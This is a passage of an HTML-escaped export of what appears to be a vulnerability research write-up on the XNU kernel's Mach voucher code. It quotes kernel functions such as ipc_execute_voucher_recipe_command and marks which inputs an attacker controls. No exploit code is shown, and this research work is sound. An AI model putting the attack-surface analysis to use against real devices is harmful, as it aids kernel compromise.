class=&quot;BGLtzooHlW-c11&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;in other vouchers to copy or &amp;quot;redeem&amp;quot; them. As discussed, the semantics of redeeming a voucher attr isn&amp;#39;t defined by the abstract voucher code and it&amp;#39;s up to the individual attr managers to decide what that means.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Once the entire recipe has been consumed and all the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;entries filled in, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;then searches the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivht_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if there&amp;#39;s an existing voucher with a matching set of attributes. Remember that each attribute value stored in a voucher is an index into the attribute controller&amp;#39;s attribute table; and those attributes are unique, so it suffices to simply compare the array of voucher indexes to determine whether all attribute values are equal. If a matching voucher is found, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a reference to the existing voucher and calls &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;to free the newly created newly-created voucher. Otherwise, if no existing, matching voucher is found, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;adds the newly created voucher to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivht_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s look at &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is responsible for filling in the requested entries in the voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;. Note that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;command&lt;/span&gt;&lt;span&gt;&amp;nbsp;are arbitrary, controlled dwords. &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer to a buffer of controlled bytes, and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;is the correct size of that input buffer. The MIG layer limits the overall input size of the recipe (which is a collection of sub-recipes) to 5260 bytes, and any input content buffers would have to fit in there.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.191bcb9f8d9273c881068813b7858079e6ae8a8c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.15&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; boolean_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_priv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t prev_val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; kern_return_t kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;isn&amp;#39;t one of the switch statement case values here so the code falls through to the default case:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.66c241fd41870ecdf298b20267a430a3c55fc901&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.16&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Here&amp;#39;s that code:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.2efb8ee4a6d79102545a6af1433eab60fcfedb02&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.17&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the manager for this key_index.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Returns a reference on the control.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_key_to_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IVAM_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;..&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_key_to_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;just subtracts 1 from key (assuming it&amp;#39;s valid and not &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATRR_KEY_ALL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;):&lt;/span&gt;&lt;/p&gt;
